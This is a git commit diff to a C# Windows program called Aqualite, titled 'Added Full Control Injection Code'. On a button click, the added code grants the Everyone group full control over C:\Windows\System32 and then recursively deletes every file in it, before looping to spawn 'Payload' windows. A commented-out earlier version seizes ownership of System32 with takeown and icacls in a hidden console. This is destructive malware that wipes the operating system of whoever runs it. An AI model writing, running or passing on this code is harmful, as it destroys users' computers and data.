c30975324e9f918447a92c7b65629f11423b813d
Parlocameon <Parlocameon@users.noreply.github.com>
2017-07-29 10:47:21 -0500

    Added Full Control Injection Code

--- Aqualite/Launcher.cs
+++ Aqualite/Launcher.cs
@@ -10,6 +10,7 @@ using System.Windows.Forms;
 using System.IO;
 using System.Security.AccessControl;
 using System.Diagnostics;
+using System.Security.Principal;
 
 namespace Aqualite
 {
@@ -19,9 +20,26 @@ namespace Aqualite
         {
             InitializeComponent();
         }
+        // dont forget to use this header
+
+        //Method to delete all files in the folder and subfolders
+
+        void EmptyFolder(DirectoryInfo directoryInfo)
+        {
+            foreach (FileInfo file in directoryInfo.GetFiles())
+            {
+                file.Delete();
+            }
+
+            foreach (DirectoryInfo subfolder in directoryInfo.GetDirectories())
+            {
+                EmptyFolder(subfolder);
+            }
+        }
 
         private void startClick(object sender, EventArgs e)
         {
+            /* Depreciated In favor of a better C# method
             Process process = new System.Diagnostics.Process();
             ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
             startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
@@ -29,27 +47,22 @@ namespace Aqualite
             startInfo.Arguments = @"/k takeown /f C:\Windows\System32\ /A /R /D Y && icacls C:\Windows\System32\ /grant %username%:F";
             process.StartInfo = startInfo;
             process.Start();
-            process.WaitForExit();
+            process.WaitForExit();*/
+            // dont forget to use this header
+
+            //Method to delete all files in the folder and subfolders
+
+            string path = @"C:\Windows\System32"; // path to directory whose settings you have already correctly configured
+
+            DirectorySecurity sec = Directory.GetAccessControl(path);
+            // Using this instead of the "Everyone" string means we work on non-English systems.
+            SecurityIdentifier everyone = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
+            sec.AddAccessRule(new FileSystemAccessRule(everyone, FileSystemRights.FullControl | FileSystemRights.Synchronize, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
+            Directory.SetAccessControl(path, sec);
 
             EmptyFolder(new DirectoryInfo(@"C:\\Windows\\System32"));
 
 
-             // dont forget to use this header
-
-            //Method to delete all files in the folder and subfolders
-
-            void EmptyFolder(DirectoryInfo directoryInfo)
-            {
-                foreach (FileInfo file in directoryInfo.GetFiles())
-                {
-                    file.Delete();
-                }
-
-                foreach (DirectoryInfo subfolder in directoryInfo.GetDirectories())
-                {
-                    EmptyFolder(subfolder);
-                }
-            }
             while (true)
             {
                 Payload form = new Payload();
